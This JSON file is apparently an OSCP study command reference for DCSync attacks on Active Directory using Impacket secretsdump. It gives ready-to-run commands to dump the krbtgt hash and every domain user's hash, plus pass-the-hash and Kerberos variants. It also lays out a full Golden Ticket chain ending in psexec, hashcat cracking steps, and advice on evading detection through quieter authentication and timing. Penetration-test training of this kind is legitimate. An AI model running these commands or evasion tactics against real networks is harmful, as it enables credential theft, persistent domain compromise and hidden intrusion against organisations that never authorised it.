{
  "metadata": {
    "file_purpose": "Active Directory DCSync with Impacket secretsdump - Linux-based credential extraction using DRSUAPI protocol. RECOMMENDED method for OSCP exams.",
    "oscp_relevance": "CRITICAL for OSCP. Impacket-secretsdump is the PRIMARY DCSync method from Kali Linux. Advantages over Mimikatz: (1) No AV/EDR on attacker machine, (2) No need for RDP/shell on Windows target, (3) Clean, parseable output, (4) Same technique works for Pass-the-Hash authentication.",
    "educational_context": "Impacket's secretsdump.py uses the DRSUAPI (Directory Replication Service API) protocol, identical to Mimikatz's lsadump::dcsync. It authenticates to the domain controller using Kerberos or NTLM, then requests credential replication as if it were another DC. The tool outputs hashes in hashcat-compatible format for immediate cracking.",
    "prerequisites": [
      "Impacket installed on Kali (apt install impacket-scripts OR pip3 install impacket)",
      "Domain Admin credentials (plaintext password OR NTLM hash for PTH)",
      "Network connectivity to Domain Controller (TCP 135, 445, 389)",
      "DNS resolution for domain (or use IP with -target-ip flag)"
    ],
    "related_techniques": [
      "Mimikatz DCSync (ad-dcsync-mimikatz-user.json)",
      "Golden Ticket (ad-golden-ticket.json)",
      "Pass the Hash (ad-pass-the-hash.json)",
      "Kerberos Authentication (ad-kerberos-auth.json)"
    ],
    "attack_chain": [
      "1. Compromise Domain Admin account (password spray, exploit, etc.)",
      "2. From Kali: impacket-secretsdump -just-dc-user krbtgt 'DOMAIN/USER:PASS@DC_IP'",
      "3. Extract krbtgt hash from output",
      "4. Create Golden Ticket OR extract other users (Administrator, service accounts)",
      "5. Use hashes for Pass-the-Hash lateral movement",
      "6. Crack hashes with Hashcat for plaintext passwords"
    ],
    "detection_evasion": [
      "Same Event ID 4662 as Mimikatz (indistinguishable from Windows-based DCSync)",
      "Use Kerberos authentication (-k flag) instead of NTLM for stealth",
      "Target specific users (-just-dc-user) instead of full dump (-just-dc)",
      "Use service account credentials (blends with automation)",
      "Perform during backup windows when replication is expected"
    ]
  },
  "commands": [
    {
      "id": "ad-dcsync-secretsdump-user",
      "name": "DCSync Specific User with Impacket (Linux)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "impacket-secretsdump -just-dc-user <USERNAME> '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'",
      "description": "Extract single user's password hash from Domain Controller using DRSUAPI replication. Linux-based alternative to Mimikatz. RECOMMENDED for OSCP exams - clean output, no Windows AV interference.",
      "variables": [
        {
          "name": "<USERNAME>",
          "description": "Target account to extract (without domain prefix). High-value targets: krbtgt, Administrator, service accounts.",
          "example": "dave",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "NetBIOS domain name or FQDN (e.g., corp or corp.com). FQDN recommended for Kerberos.",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<DA_USER>",
          "description": "Domain Admin username for authentication (without domain prefix)",
          "example": "jeffadmin",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Plaintext password for DA account. Use single quotes to escape special characters. For PTH, use -hashes flag instead.",
          "example": "BrouhahaTungPerorateBroom2023!",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "IP address of Domain Controller. Alternatively use FQDN (e.g., DC1.corp.com) with -target-ip for Kerberos.",
          "example": "192.168.50.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "impacket-secretsdump": "Python-based tool from Impacket suite that dumps credentials from Windows systems. For DCSync, it uses DRSUAPI protocol to request password replication. Advantages: (1) Runs on Linux (no Windows AV), (2) Clean text output (easy parsing), (3) Multiple authentication methods (password, hash, Kerberos), (4) Actively maintained by Fortra/Core Security.",
        "-just-dc-user <USERNAME>": "Extract ONLY the specified user account. Output includes NTLM hash, password history, and Kerberos keys (AES256, AES128). CRITICAL: Significantly reduces output volume and log noise compared to full dump. WHY: Single user extraction is faster, stealthier, and OSCP-appropriate (you rarely need all 10,000 domain accounts).",
        "Authentication string format": "'DOMAIN/USER:PASS@TARGET' - CRITICAL: Use SINGLE QUOTES to prevent shell interpretation of special characters (!,$,\\,etc.). The domain can be NetBIOS (corp) or FQDN (corp.com). For Kerberos auth, use FQDN. WHY QUOTES: Passwords with special chars like BrouhahaTungPerorateBroom2023! will break without quotes.",
        "Optional: -target-ip <DC_IP>": "Explicitly specify DC IP for Kerberos authentication when using FQDN. Example: -just-dc-user krbtgt -target-ip 192.168.50.70 'corp.com/admin:pass@DC1.corp.com'. WHY: Kerberos requires FQDNs but DNS may not resolve - this allows FQDN for Kerberos with manual IP routing.",
        "Optional: -hashes :<NTLM_HASH>": "Authenticate using NTLM hash (Pass-the-Hash) instead of password. Colon prefix required (:-hashes :NTLM). Example: impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c -just-dc-user krbtgt 'corp.com/admin@192.168.50.70'. WHY: You may have obtained DA hash via other means (SMB relay, responder) but not plaintext password.",
        "Optional: -k (Kerberos auth)": "Use Kerberos authentication instead of NTLM. Requires valid TGT in KRB5CCNAME env variable. Stealthier than NTLM but complex setup. Example: export KRB5CCNAME=admin.ccache && impacket-secretsdump -k -just-dc-user krbtgt 'corp.com/admin@DC1.corp.com'"
      },
      "success_indicators": [
        "Output: 'Impacket v0.x.x - Copyright 2022 SecureAuth Corporation'",
        "Output: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)'",
        "Output: '[*] Using the DRSUAPI method to get NTDS.DIT secrets'",
        "Output: '<USERNAME>:<RID>:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::' - Hashcat format",
        "Output: '[*] Kerberos keys grabbed' (followed by AES256/AES128/DES keys)",
        "Output: '[*] Cleaning up...'",
        "Hash format: LM hash (usually aad3b435b51404eeaad3b435b51404ee = empty) : NTLM hash (32 hex chars)"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "[-] SMB SessionError: STATUS_ACCESS_DENIED",
        "[-] DCERPC Runtime Error: code: 0x2105 - ERROR_DS_DRA_ACCESS_DENIED",
        "[-] RemoteOperations failed: SMB SessionError",
        "[Errno 111] Connection refused",
        "[-] Kerberos SessionError: KRB_AP_ERR_SKEW"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Solution: Verify username and password: smbclient -L //<DC_IP> -U <DOMAIN>/<USER>. Check password for typos (passwords are case-sensitive). Verify account not locked: crackmapexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN>. Test with different domain format (NetBIOS vs FQDN).",
        "ERROR_DS_DRA_ACCESS_DENIED (0x2105)": "User lacks replication privileges. Solution: Verify Domain Admin membership: crackmapexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --groups. Alternative: Use known DA account. Check group membership: rpcclient -U '<DOMAIN>/<USER>%<PASS>' <DC_IP> -c 'enumdomgroups; querygroupmem 0x200' (0x200 = Domain Admins RID 512).",
        "Connection refused (port 445)": "SMB not reachable. Solution: Verify DC IP: ping <DC_IP>. Check firewall: sudo nmap -p 445,135,389 -Pn <DC_IP>. If only RDP available, use Mimikatz instead OR tunnel SMB through SSH: ssh -L 445:localhost:445 user@target. Verify not targeting workstation (must target DC).",
        "KRB_AP_ERR_SKEW (Kerberos time skew)": "Clock difference > 5 minutes between Kali and DC. Solution: Sync time: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Verify time: date && net time \\\\<DC_IP>. If ntpdate unavailable: sudo timedatectl set-time '<DC_TIME>'. Kerberos requires <5min time difference.",
        "SMB SessionError: STATUS_ACCESS_DENIED (different from 0x2105)": "SMB signing or encryption issue. Solution: Try different SMB dialect: impacket-secretsdump -just-dc-user <USER> '<DOMAIN>/<USER>:<PASS>@<DC_IP>' -dc-ip <DC_IP>. Or use NetBIOS name instead of IP. Check SMB signing: crackmapexec smb <DC_IP> --gen-relay-list relay.txt",
        "Impacket command not found": "Impacket not installed. Solution: Install: sudo apt install impacket-scripts (Debian/Kali) OR pip3 install impacket (manual install). Verify: which impacket-secretsdump. If pip installed: use secretsdump.py instead of impacket-secretsdump (script name differs).",
        "Special characters in password break command": "Shell interpreting password chars. Solution: ALWAYS use single quotes around auth string: 'domain/user:P@ss!@<DC>'. If single quote in password, escape: 'domain/user:P@ss'\"'\"'word@DC'. Test password: smbclient -L //<DC> -U 'domain/user%password'"
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "next_steps": [
        "windows-hashcat-crack-ntlm",
        "ad-pass-the-hash-impacket-psexec",
        "ad-golden-ticket-impacket-create"
      ],
      "alternatives": [
        "ad-dcsync-mimikatz-user",
        "ad-dcsync-secretsdump-pth"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "IMPACKET",
        "POST_EXPLOITATION",
        "LINUX",
        "OSCP:HIGH",
        "KALI"
      ],
      "oscp_relevance": "high",
      "notes": "THIS IS THE PREFERRED DCSYNC METHOD FOR OSCP. Why: (1) Works from Kali (no Windows access needed), (2) No AV interference, (3) Output ready for Hashcat, (4) Same command works with -hashes for PTH. CRITICAL EXAM TIP: ALWAYS use single quotes around auth string to handle special chars in passwords. Output format is Hashcat-ready - copy the dave:1103:aad3b...:08d7a47... line directly into hashcat. Time estimate: 2-10 seconds for single user.\n\nMANUAL ALTERNATIVES:\nPass-the-Hash (when you have NTLM hash, not password):\nimpacket-secretsdump -hashes :<NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<USER>@<DC_IP>'\n\nUse DC FQDN with explicit IP:\nimpacket-secretsdump -just-dc-user Administrator -target-ip 192.168.50.70 'corp.com/admin:pass@DC1.corp.com'\n\nKerberos authentication (requires TGT):\nexport KRB5CCNAME=admin.ccache\nimpacket-secretsdump -k -no-pass -just-dc-user krbtgt 'corp.com/admin@DC1.corp.com'\n\nDump with history:\nimpacket-secretsdump -just-dc-user dave -history '<DOMAIN>/<USER>:<PASS>@<DC_IP>'\n\nExtract multiple users:\nfor user in dave Administrator krbtgt; do impacket-secretsdump -just-dc-user $user 'corp.com/admin:pass@192.168.50.70' | grep \"$user:\"; done\n\nParse NTLM hash only:\nimpacket-secretsdump -just-dc-user dave 'corp.com/admin:pass@192.168.50.70' | grep dave: | cut -d':' -f4\n\nTIME ESTIMATE: 2-10 seconds (single user), 30-120 seconds (full domain dump with -just-dc)"
    },
    {
      "id": "ad-dcsync-secretsdump-krbtgt",
      "name": "DCSync krbtgt with Impacket (Golden Ticket)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'",
      "description": "Extract krbtgt account hash for Golden Ticket creation. CRITICAL first step after achieving Domain Admin access. The krbtgt hash enables persistent domain-wide access via forged TGTs.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (NetBIOS or FQDN)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<DA_USER>",
          "description": "Domain Admin username",
          "example": "jeffadmin",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "DA password (use single quotes for special characters)",
          "example": "BrouhahaTungPerorateBroom2023!",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain Controller IP address",
          "example": "192.168.50.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "-just-dc-user krbtgt": "Extracts ONLY the krbtgt account (RID 502). Output includes NTLM hash (for RC4 Golden Ticket) and AES256/AES128 keys (for AES Golden Ticket - more stealthy). The krbtgt account is the Kerberos Ticket Granting Ticket service account - its hash is used to encrypt all TGTs issued by the domain. CRITICAL: Save this hash securely - it's your persistent backdoor into the domain.",
        "Why krbtgt first": "With krbtgt hash, you can create Golden Tickets granting Domain Admin rights to ANY user, even after defenders change all passwords. The krbtgt password rarely changes (only during DC promotions or manual rotation). This provides long-term persistence independent of other account credentials."
      },
      "success_indicators": [
        "Output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::' - NTLM hash for Golden Ticket",
        "Output: 'krbtgt:aes256-cts-hmac-sha1-96:<AES256_KEY>' - For AES256 Golden Ticket",
        "Output: 'krbtgt:aes128-cts-hmac-sha1-96:<AES128_KEY>'",
        "RID is always 502 for krbtgt",
        "LM hash portion is empty (aad3b435b51404eeaad3b435b51404ee = no LM hash)"
      ],
      "failure_indicators": [
        "ERROR_DS_DRA_ACCESS_DENIED",
        "STATUS_LOGON_FAILURE",
        "Connection refused"
      ],
      "troubleshooting": {
        "Same as ad-dcsync-secretsdump-user": "Refer to troubleshooting section in ad-dcsync-secretsdump-user. krbtgt extraction has identical requirements and failure modes.",
        "Empty output but no error": "User may exist but krbtgt filtered. Solution: Try without -just-dc-user to dump all, then grep for krbtgt: impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<DC_IP>' -just-dc | grep krbtgt"
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "next_steps": [
        "ad-sid-whoami-extract",
        "ad-golden-ticket-impacket-create",
        "ad-golden-ticket-ticketer-create"
      ],
      "alternatives": [
        "ad-dcsync-mimikatz-krbtgt",
        "ad-lsa-dump-krbtgt"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "GOLDEN_TICKET",
        "IMPACKET",
        "PERSISTENCE",
        "OSCP:HIGH",
        "KALI"
      ],
      "oscp_relevance": "high",
      "notes": "ALWAYS the FIRST target after achieving Domain Admin. OSCP EXAM WORKFLOW: (1) Get DA, (2) DCSync krbtgt, (3) Save hash externally, (4) Get Domain SID (lookupsid.py or rpcclient), (5) Create Golden Ticket with ticketer.py or Mimikatz. The output line you need: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32_HEX_CHARS>:::' - copy the 32 hex characters after the third colon. Time estimate: 2-10 seconds.\n\nMANUAL ALTERNATIVES:\nWith Pass-the-Hash:\nimpacket-secretsdump -hashes :<DA_NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<DA_USER>@<DC_IP>'\n\nExtract krbtgt + get Domain SID in one command:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' && \\\nrpcclient -U 'corp.com/admin%pass' 192.168.50.70 -c 'lsaquery'\n\nParse NTLM hash only (for ticketer.py):\nkrbtgt_hash=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' | grep krbtgt | cut -d':' -f4)\necho \"krbtgt NTLM hash: $krbtgt_hash\"\n\nExtract both NTLM and AES256:\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' > krbtgt_full.txt\ngrep aes256 krbtgt_full.txt\n\nGolden Ticket workflow (complete chain):\n# 1. Get krbtgt hash\nimpacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'\n# 2. Get Domain SID\nlookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep \"Domain SID\"\n# 3. Create Golden Ticket\nticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator\n# 4. Use ticket\nexport KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass corp.com/Administrator@DC1.corp.com\n\nTIME ESTIMATE: 2-10 seconds (extraction only), 1-2 minutes (full Golden Ticket workflow)"
    },
    {
      "id": "ad-dcsync-secretsdump-all",
      "name": "DCSync All Domain Hashes (Full Dump)",
      "category": "post-exploit",
      "subcategory": "active-directory",
      "command": "impacket-secretsdump -just-dc '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'",
      "description": "Extract ALL domain user password hashes via DCSync. Equivalent to dumping NTDS.dit but remote and cleaner. Use sparingly - generates significant DC logs and traffic.",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (NetBIOS or FQDN)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<DA_USER>",
          "description": "Domain Admin username",
          "example": "jeffadmin",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "DA password (single quotes for special chars)",
          "example": "BrouhahaTungPerorateBroom2023!",
          "required": true
        },
        {
          "name": "<DC_IP>",
          "description": "Domain Controller IP address",
          "example": "192.168.50.70",
          "required": true
        }
      ],
      "flag_explanations": {
        "-just-dc": "Dump ALL domain credentials using DRSUAPI (DCSync method). Extracts NTLM hashes for every user account, computer account, and service account in the domain. Output can be 1000s of lines in large domains. CRITICAL: This is NOISY - generates Event ID 4662 for EVERY account replicated. WHY NOT -just-dc-user: Full dump useful for offline password analysis (find weak passwords across domain), credential correlation (same password reuse), and computer account analysis.",
        "Output format": "Each line: username:uid:lmhash:nthash::: - Ready for Hashcat mode 1000. Computer accounts end with $ (e.g., CLIENT75$). Service accounts may have SPNs (useful for Kerberoasting correlation). Built-in accounts (krbtgt, Administrator) appear first.",
        "Difference from -just-dc-ntlm": "-just-dc dumps NTDS.dit secrets via DRSUAPI (DCSync). Alternative flags: -just-dc-user (single user), -just-dc-ntlm (hashes only, no Kerberos keys), -pwd-last-set (include password age). For OSCP, -just-dc or -just-dc-user are most relevant."
      },
      "success_indicators": [
        "Output: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)'",
        "Output: '[*] Using the DRSUAPI method to get NTDS.DIT secrets'",
        "Hundreds or thousands of lines of hashes (depending on domain size)",
        "Output includes: krbtgt:502, Administrator:500, DOMAIN\\user:uid:...",
        "Output ends with: '[*] Kerberos keys grabbed' (followed by AES keys)",
        "Output ends with: '[*] Cleaning up...'"
      ],
      "failure_indicators": [
        "ERROR_DS_DRA_ACCESS_DENIED",
        "STATUS_LOGON_FAILURE",
        "Connection timeout (large domains may take minutes)"
      ],
      "troubleshooting": {
        "Command hangs / timeout": "Large domain (10,000+ users) taking time. Solution: Be patient (can take 5-15 minutes for large domains). Alternatively, target specific high-value users with -just-dc-user instead. Monitor progress: impacket-secretsdump -just-dc 'domain/user:pass@dc' -debug (shows each user being processed). Kill and retry with -just-dc-ntlm for faster dump (skips Kerberos keys).",
        "Partial output then error": "Network interruption or DC timeout. Solution: Save output immediately: impacket-secretsdump -just-dc 'domain/user:pass@dc' > hashes.txt. Retry dump and compare: diff hashes.txt hashes2.txt. If repeatedly failing, target users individually with -just-dc-user.",
        "Too much output": "Expected for full dumps. Solution: Redirect to file: impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' > all_hashes.txt. Parse specific users: grep -i administrator all_hashes.txt. Extract only NTLM column: cut -d':' -f4 all_hashes.txt > ntlm_only.txt. Feed to Hashcat: hashcat -m 1000 ntlm_only.txt rockyou.txt"
      },
      "prerequisites": [
        "ad-dcsync-check-domain-admins"
      ],
      "next_steps": [
        "windows-hashcat-crack-ntlm-file",
        "ad-password-analysis-weak",
        "ad-hash-deduplication"
      ],
      "alternatives": [
        "ad-dcsync-secretsdump-user",
        "ad-ntds-dit-extraction"
      ],
      "tags": [
        "ACTIVE_DIRECTORY",
        "DCSYNC",
        "CREDENTIAL_DUMPING",
        "IMPACKET",
        "POST_EXPLOITATION",
        "OSCP:MEDIUM",
        "KALI"
      ],
      "oscp_relevance": "medium",
      "notes": "RARELY needed in OSCP - usually target specific users (krbtgt, Administrator) instead. Full dumps useful for: (1) Real penetration tests (password security analysis), (2) CTF/lab environments (find hidden admin accounts), (3) Offline analysis (correlate credentials, find password patterns). OSCP TIP: Prefer -just-dc-user for exam - faster, quieter, more targeted. Full dumps can take 30+ seconds on small domains, 15+ minutes on large domains. Time estimate: 30 seconds - 15 minutes (domain size dependent).\n\nMANUAL ALTERNATIVES:\nSave to file for analysis:\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' -outputfile corp_hashes\n# Creates: corp_hashes.ntds (hashes), corp_hashes.secrets (LSA secrets), corp_hashes.cached (cached creds)\n\nFaster dump (NTLM only, no Kerberos keys):\nimpacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70'\n\nFilter enabled users only:\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -v \"ACCOUNTDISABLE\"\n\nExtract specific user types:\n# Administrators only (RID 500-520)\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep \":50[0-9]:\"\n# Computer accounts\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep \"\\$:\"\n# Service accounts (common naming)\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -i \"svc\\|service\\|sql\\|backup\"\n\nHashcat workflow:\nimpacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' > all_hashes.txt\ncut -d':' -f4 all_hashes.txt > ntlm_hashes.txt\nhashcat -m 1000 ntlm_hashes.txt rockyou.txt -r best64.rule --force\n\nTIME ESTIMATE: 30 seconds (small domain <100 users), 2-5 minutes (medium <1000 users), 10-30 minutes (large 5000+ users)"
    }
  ]
}
